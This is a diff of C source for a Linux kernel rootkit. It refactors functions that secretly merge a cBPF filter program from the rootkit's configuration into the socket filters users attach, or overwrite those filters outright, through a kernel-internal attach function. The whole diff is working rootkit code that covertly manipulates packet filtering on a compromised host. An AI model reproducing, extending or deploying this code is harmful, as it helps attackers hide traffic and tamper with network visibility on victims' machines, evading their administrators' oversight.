@@ -4,6 +4,8 @@
 #include "../../utils.h"
 #include "../../config.h"
 
+static const int ROOTI_MAX_BPF_PROGRAM_LEN = 255;
+
 /*
     Replace ret instructions with a positive return value (e.g instructions to 'accept' the packet) with a jump instruction
     to the start of the user-defined BPF program (e.g 'program_offset').
@@ -49,27 +51,19 @@ static int rooti_concat_filter_programs(struct sock_fprog_kern *src_fprog1, stru
     Copies the userspace BPF filter program pointed to by 'fprog_ptr' into the parallel kernelspace structure.
     The filter of the kernel structure is heap-allocated and should be freed later.
 */
-int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, sockptr_t fprog_ptr, int fprog_len)
+static int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, struct sock_fprog *user_fprog)
 {
-    struct sock_fprog user_fprog;
-    size_t user_program_size;
+    size_t user_program_size = bpf_classic_proglen(user_fprog);
     int err;
 
-    err = copy_bpf_fprog_from_user(&user_fprog, fprog_ptr, fprog_len);
-    if (err) {
-        ROOTI_DEBUG("copy_bpf_fprog_from_user() failed: %d", err);
-        return err;
-    }
-
-    user_fprog_kernel->len = user_fprog.len;
-    user_fprog_kernel->filter = kcalloc(user_fprog_kernel->len, sizeof(struct sock_filter), GFP_KERNEL);
+    user_fprog_kernel->len = user_fprog->len;
+    user_fprog_kernel->filter = kmalloc(user_program_size, GFP_KERNEL);
     if (user_fprog_kernel->filter == NULL) {
         ROOTI_DEBUG("failed to allocate memory");
         return -ENOMEM;
     }
 
-    user_program_size = bpf_classic_proglen((&user_fprog));
-    err = copy_from_user(user_fprog_kernel->filter, user_fprog.filter, user_program_size);
+    err = copy_from_user(user_fprog_kernel->filter, user_fprog->filter, user_program_size);
     if (err) {
         ROOTI_DEBUG("copy_from_user() failed: %d", err);
         return -EFAULT;
@@ -78,34 +72,14 @@ int rooti_copy_user_fprog(struct sock_fprog_kern *user_fprog_kernel, sockptr_t f
     return 0;
 }
 
-/*
-    This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
-    to the filters specified by the user. It effectively merges the user defined filter program with the rootkit's
-    filter program such that both filters must be satisfied in order to accept the packet.
-*/
-int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_fprog)
+// Attaches a new BPF filter program 'fprog' to the provided socket 'sock'
+static int rooti_attach_traffic_filter(struct sock *sock, struct sock_fprog_kern *fprog)
 {
     ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
-
-    struct sock_fprog_kern kern_fprog = {
-        .filter = ROOTI_BPF_FILTER_PROGRAM,
-        .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
-    };
-    struct sock_fprog_kern merged_fprog;
     struct bpf_prog *bpf_prog;
     int err;
 
-    if (kern_fprog.len > 255) {
-        ROOTI_DEBUG("configured BPF filter is longer than the maximum of 255 instructions");
-        return -EINVAL;
-    }
-
-    err = rooti_concat_filter_programs(&kern_fprog, user_fprog, &merged_fprog);
-    if (err) {
-        return err;
-    }
-
-    err = bpf_prog_create(&bpf_prog, &merged_fprog);
+    err = bpf_prog_create(&bpf_prog, fprog);
     if (bpf_prog == NULL) {
         ROOTI_DEBUG("bpf_prog_create() failed %d", err);
         return err;
@@ -117,9 +91,43 @@ int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_
         ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
         return err;
     }
-
-    kfree(merged_fprog.filter);
     return 0;
+}
+
+/*
+    This function attaches additional cBPF filters (which are specifyed in the rootkit's configuration)
+    to the filters specified by the user. It effectively merges the user defined filter program with the rootkit's
+    filter program such that both filters must be satisfied in order to accept the packet.
+*/
+int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog *user_fprog)
+{
+    struct sock_fprog_kern kernel_fprog = {
+        .filter = ROOTI_BPF_FILTER_PROGRAM,
+        .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
+    };
+    struct sock_fprog_kern user_fprog_kernel;
+    struct sock_fprog_kern merged_fprog;
+    int err;
+
+    if (kernel_fprog.len > ROOTI_MAX_BPF_PROGRAM_LEN) {
+        ROOTI_DEBUG("configured BPF filter is longer than the maximum of 255 instructions");
+        return -EINVAL;
+    }
+
+    err = rooti_copy_user_fprog(&user_fprog_kernel, user_fprog);
+    if (err) {
+        return err;
+    }
+
+    err = rooti_concat_filter_programs(&kernel_fprog, &user_fprog_kernel, &merged_fprog);
+    if (err) {
+        return err;
+    }
+
+    err = rooti_attach_traffic_filter(sock, &merged_fprog);
+    kfree(merged_fprog.filter);
+
+    return err;
 }
 
 /*
@@ -128,27 +136,14 @@ int rooti_inject_traffic_filter(struct sock *sock, struct sock_fprog_kern *user_
 */
 int rooti_overwrite_traffic_filter(struct sock *sock)
 {
-    ROOTI_RESOLVE_FUNC_ADDR(__sk_attach_prog, -EINVAL, int, struct bpf_prog *, struct sock *);
-
     struct sock_fprog_kern fprog = {
         .filter = ROOTI_BPF_FILTER_PROGRAM,
         .len = ROOTI_BPF_FILTER_PROGRAM_COUNT
     };
-    struct bpf_prog *bpf_prog;
-    int err;
 
-    err = bpf_prog_create(&bpf_prog, &fprog);
-    if (bpf_prog == NULL) {
-        ROOTI_DEBUG("bpf_prog_create() failed %d", err);
-        return err;
+    if (fprog.len > ROOTI_MAX_BPF_PROGRAM_LEN) {
+        ROOTI_DEBUG("configured BPF filter is longer than the maximum of 255 instructions");
+        return -EINVAL;
     }
-
-    err = ____sk_attach_prog(bpf_prog, sock);
-    if (err) {
-        bpf_prog_destroy(bpf_prog);
-        ROOTI_DEBUG("__sk_attach_prog() failed: %d", err);
-        return err;
-    }
-
-    return 0;
+    return rooti_attach_traffic_filter(sock, &fprog);
 }
